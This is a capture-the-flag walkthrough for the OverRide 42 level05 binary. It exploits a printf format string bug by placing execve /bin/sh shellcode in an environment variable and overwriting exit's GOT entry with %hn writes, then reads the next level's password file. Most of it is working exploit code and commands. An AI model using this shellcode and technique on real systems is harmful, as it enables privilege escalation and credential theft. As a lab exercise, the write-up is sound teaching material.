# Level05 Exploit (OverRide 42)

## Goal

Exploit a format string vulnerability in the `level05` binary to execute shellcode and escalate to `level06`.

---

## 1. Understand the Vulnerability

```bash
$ ./level05
coucou
coucou
```

Using GDB:

```bash
gdb ./level05
disassemble main
```

We find the following:

```asm
0x08048500 <+188>: lea eax,[esp+0x28]   ; buffer
0x08048504 <+192>: mov DWORD PTR [esp],eax
0x08048507 <+195>: call 0x8048340 <printf@plt>
```

It reads user input using `fgets` into a 100-byte buffer and then prints it using `printf(buffer)` — vulnerable to format string attacks.

---

## 2. Check Stack Position

```bash
$ python -c 'print("BBBB-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x")' | ./level05
```

Look for the position where "BBBB" appears — in this case, it's typically at **10th argument**.

---

## 3. Prepare Shellcode

Use a NOP sled and standard shell-spawning shellcode:

```bash
export PAYLOAD=$(python -c 'print("\x90"*1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")')
```

Or without exporting:

```bash
PAYLOAD=$(python -c 'print("\x90"*1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")')
```

---

## 4. Get Shellcode Address

Create helper to print env var address:

**getenv.c**:

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    printf("%p\n", getenv(argv[1]));
    return 0;
}
```

Compile:

```bash
gcc -m32 -o getenv getenv.c
```

Run:

```bash
$ env -i PAYLOAD=$PAYLOAD /tmp/getenv PAYLOAD
0xffffdc59  # example address, varies
```

---

## 5. Locate exit() in GOT

Use GDB:

```bash
gdb ./level05
(gdb) info functions exit
```

Find `exit@plt`: `0x08048370`, which jumps to:

```bash
(gdb) x/i 0x08048370
=> jmp *0x080497e0
```

So `exit@got.plt` = `0x080497e0`

---

## 6. Craft Format String

Split shellcode address (example `0xffffdc59`) in hex:

* Low: `0xdc59`
* High: `0xffff`

Write to 2 bytes at `0x080497e0` and `0x080497e2`

Format string payload:

```bash
python -c 'print("\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%56401d" + "%10$hn" + "%9126d" + "%11$hn")'
```

Explanation:

* `\xe0\x97\x04\x08`: address to write lower 2 bytes
* `\xe2\x97\x04\x08`: address to write higher 2 bytes
* `%56401d`: pad to `0xdc59`
* `%10$hn`: write to first address
* `%9126d`: pad to `0xffff`
* `%11$hn`: write to second address

---

## 7. Exploit!

Launch with shellcode in env and payload through `stdin`:

```bash
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"';cat) | env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05
```

If successful:

```bash
whoami
level06
cat /home/users/level06/.pass
```

---

## Summary

* Vulnerability: format string via `printf(buffer)`
* Technique: overwrite `exit@got` with shellcode address
* Delivery: shellcode via env var `PAYLOAD`, exploit via `stdin`

